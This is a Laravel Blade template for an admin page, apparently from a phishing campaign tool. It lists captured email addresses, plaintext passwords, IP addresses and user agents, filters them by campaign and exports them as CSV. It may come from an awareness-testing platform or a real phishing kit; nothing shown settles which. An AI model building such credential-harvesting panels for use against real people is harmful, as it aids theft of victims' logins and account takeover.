@extends('layouts.app')
@section('content')

<div class="container mt-4">
    <h2>Phishing Logs - Captured Credentials</h2>
    
    <div class="mb-3 d-flex gap-2">
        <form method="GET" class="form-inline flex-grow-1">
            <select name="campaign_id" class="form-control me-2">
                <option value="">All Campaigns</option>
                @foreach(\App\Models\Campaign::all() as $campaign)
                    <option value="{{ $campaign->id }}" {{ request('campaign_id') == $campaign->id ? 'selected' : '' }}>
                        {{ $campaign->subject }}
                    </option>
                @endforeach
            </select>
            <button type="submit" class="btn btn-primary">Filter</button>
        </form>
        <a href="{{ route('export.phishing-logs', request()->all()) }}" class="btn btn-success">📥 Export CSV</a>
    </div>

    @if($logs->isEmpty())
        <div class="alert alert-info">No phishing logs captured yet.</div>
    @else
        <div class="card">
            <div class="card-header">
                <h5>Total Credentials Captured: {{ $logs->total() }}</h5>
            </div>
            <div class="table-responsive">
                <table class="table table-striped">
                    <thead>
                        <tr>
                            <th>Campaign</th>
                            <th>Email/Username</th>
                            <th>Password</th>
                            <th>IP Address</th>
                            <th>User Agent</th>
                            <th>Captured</th>
                        </tr>
                    </thead>
                    <tbody>
                        @foreach($logs as $log)
                        <tr>
                            <td>
                                @if($log->campaign)
                                    <a href="{{ route('campaigns.show', $log->campaign->id) }}">
                                        {{ $log->campaign->subject }}
                                    </a>
                                @else
                                    <span class="badge bg-warning">Unknown</span>
                                @endif
                            </td>
                            <td>
                                <code>{{ $log->email }}</code>
                            </td>
                            <td>
                                <code>{{ $log->password }}</code>
                            </td>
                            <td>{{ $log->ip_address }}</td>
                            <td>
                                <small>{{ substr($log->user_agent, 0, 50) }}...</small>
                            </td>
                            <td>{{ $log->created_at->format('M d, Y H:i') }}</td>
                        </tr>
                        @endforeach
                    </tbody>
                </table>
            </div>
        </div>

        <!-- Pagination -->
        <div class="mt-4">
            {{ $logs->links() }}
        </div>
    @endif
</div>

@endsection
